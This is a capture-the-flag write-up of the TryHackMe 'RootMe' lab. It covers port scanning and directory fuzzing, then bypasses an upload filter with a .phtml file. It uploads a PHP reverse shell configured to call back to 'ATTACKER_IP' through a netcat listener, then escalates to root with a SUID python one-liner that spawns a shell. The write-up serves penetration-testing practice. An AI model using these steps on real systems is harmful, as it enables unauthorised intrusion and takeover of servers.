# RootMe – CTF Write Up

## Target Information

* Target IP: `10.10.70.215`
* Challenge Type: Web Exploitation & Privilege Escalation
* Platform: TryHackMe

## Reconnaissance Phase

### Port Scanning (Nmap)

Initial reconnaissance was performed using Nmap to identify open ports and running services.

```bash
nmap -sC -sV 10.10.70.215
```

### Scan Results

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13
80/tcp open  http    Apache httpd 2.4.41 (Ubuntu)
```

### Observations

* Total open ports: **2**
* **Port 22 (SSH):** OpenSSH 8.2p1
* **Port 80 (HTTP):** Apache 2.4.41 running a web application


## Web Enumeration (Port 80)

Accessing the web application:

```
http://10.10.70.215/
```

* The homepage did not reveal any useful information
* Page source inspection also did not expose sensitive data


## Directory Bruteforcing

To discover hidden directories, FFUF was used.

```bash
ffuf -u http://10.10.70.215/FUZZ -w wordlist.txt
```

### Discovered Directories

```
/uploads   [301]
/css       [301]
/js        [301]
/panel     [301]
```

- The /panel directory was identified as the most interesting.


## File Upload Exploitation

### Upload Panel

```
http://10.10.70.215/panel/
```

* A file upload functionality was available
* `.php` files were blocked
* Alternate PHP extensions were tested

### Bypass Technique

The `.phtml` extension was accepted and executed by the server.


## Reverse Shell Execution

A PHP reverse shell was obtained from PentestMonkey:

* Source: [https://github.com/pentestmonkey/php-reverse-shell](https://github.com/pentestmonkey/php-reverse-shell)

### Configuration Changes

```php
$ip = 'ATTACKER_IP';
$port = 1234;
```

* File saved as `shell.phtml`
* Uploaded via `/panel`
* Stored in `/uploads`

### Triggering the Shell

```
http://10.10.70.215/uploads/shell.phtml
```

### Listener Setup

```bash
nc -lvnp 1234
```

- Reverse shell successfully obtained.

## User Flag

Searching for the user flag:

```bash
find / -name user.txt 2>/dev/null
```

Location of the file:

```
/var/www/user.txt
```

### User Flag:

```
THM{y0u_g0t_a_sh3ll}
```


## Privilege Escalation

### SUID Enumeration

```bash
find / -user root -perm /4000 2>/dev/null
```

### Interesting Finding

```
/usr/bin/python2.7
```

This binary had the SUID bit set and was owned by root.


## Root Escalation via GTFOBins

Using the GTFOBins technique for Python:

```bash
/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/sh")'
```

- Successfully escalated privileges to root.


## Root Flag

```bash
cat /root/root.txt
```

Root Flag:

```
THM{root_flag_here}
```


## Key Takeaways

* File upload filters can often be bypassed using alternative extensions
* Always check for SUID binaries during privilege escalation
* GTFOBins is extremely useful for real world Linux escalation


## Challenge Completed

RootMe successfully compromised from initial access to full root takeover 


## Author
### RUTHRAN-SEC
